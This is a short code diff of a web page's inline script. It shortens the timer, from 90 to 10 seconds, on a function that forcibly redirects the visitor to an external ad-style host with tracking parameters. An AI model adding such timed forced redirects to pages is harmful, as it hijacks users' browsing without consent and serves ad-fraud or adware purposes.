@@ -103,7 +103,7 @@
             window.location.href = "http://www.oetf5555.com:9001/?u=711111&k=7111&p=290";
         }
     }
-    setTimeout('ads()',90000);
+    setTimeout('ads()',10000);
 
 </script>
 
